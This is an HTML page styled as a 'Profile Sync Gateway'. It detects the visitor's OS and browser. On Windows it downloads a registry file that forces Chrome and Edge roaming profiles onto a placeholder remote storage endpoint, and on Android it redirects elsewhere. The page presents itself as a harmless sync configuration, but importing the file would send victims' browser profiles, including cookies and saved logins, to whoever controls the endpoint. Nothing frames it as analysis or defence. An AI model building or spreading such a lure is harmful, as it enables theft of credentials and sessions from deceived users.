<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Profile Synchronization Gateway</title>
    <style>
        body { 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
            text-align: center; 
            padding: 50px 20px; 
            background: #f4f6f9; 
            color: #333; 
        }
        .container { 
            max-width: 420px; 
            margin: 0 auto; 
            background: white; 
            padding: 40px 30px; 
            border-radius: 16px; 
            box-shadow: 0 4px 20px rgba(0,0,0,0.05); 
        }
        h2 { margin-top: 0; color: #111; font-size: 24px; }
        .status { 
            font-size: 15px; 
            color: #555; 
            margin-bottom: 30px; 
            line-height: 1.6; 
            background: #f8f9fa;
            padding: 15px;
            border-radius: 8px;
            border: 1px solid #e9ecef;
        }
        .action-btn { 
            display: inline-block; 
            background: #007bff; 
            color: white; 
            padding: 16px 32px; 
            font-size: 16px; 
            font-weight: bold; 
            border: none; 
            border-radius: 8px; 
            cursor: pointer; 
            text-decoration: none; 
            width: 100%; 
            box-sizing: border-box; 
            transition: background 0.2s; 
        }
        .action-btn:hover { background: #0056b3; }
    </style>
</head>
<body>

    <div class="container">
        <h2>Profile Sync Gateway</h2>
        <div class="status" id="env-status">Analyzing browser runtime...</div>
        <button class="action-btn" onclick="initializeGateway()">Deploy Sync Configuration</button>
    </div>

    <script>
        // Environmental Analysis Matrix
        const ua = navigator.userAgent.toLowerCase();
        let currentOS = "unknown";
        let activeBrowser = "unknown";

        if (ua.includes("win")) currentOS = "windows";
        else if (ua.includes("android")) currentOS = "android";

        if (ua.includes("edg/")) activeBrowser = "edge";
        else if (ua.includes("chrome/") && !ua.includes("chromium")) activeBrowser = "chrome";
        else if (ua.includes("firefox/")) activeBrowser = "firefox";

        document.getElementById('env-status').innerHTML = 
            `Infrastructure Detected:<br><b>${currentOS.toUpperCase()}</b> running <b>${activeBrowser.toUpperCase()}</b>`;

        function initializeGateway() {
            // Secure Central Synchronization Gateway URL
            const syncEndpoint = "https://YOUR_SECURE_STORAGE_ENDPOINT/browser-sync";

            if (currentOS === "windows") {
                // Windows Management Payload
                let regPayload = `Windows Registry Editor Version 5.00\r\n\r\n` +
                    `[HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Google\\Chrome]\r\n` +
                    `"RoamingProfileSupportEnabled"=dword:00000001\r\n` +
                    `"RoamingProfileLocation"="${syncEndpoint}\\\\Chrome"\r\n\r\n` +
                    `[HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Edge]\r\n` +
                    `"RoamingProfileSupportEnabled"=dword:00000001\r\n` +
                    `"RoamingProfileLocation"="${syncEndpoint}\\\\Edge"`;

                const blob = new Blob([regPayload], { type: "text/plain" });
                const link = document.createElement("a");
                link.href = URL.createObjectURL(blob);
                link.download = "Configure_Browser_Sync.reg";
                link.click();
            } 
            else if (currentOS === "android") {
                // Android Architecture Pathway
                // Directs users to register their mobile ecosystem through secure Android Enterprise Management
                window.location.href = "https://google.com";
            } else {
                alert("The system was unable to map an automated synchronization path for this platform.");
            }
        }
    </script>
</body>
</html>
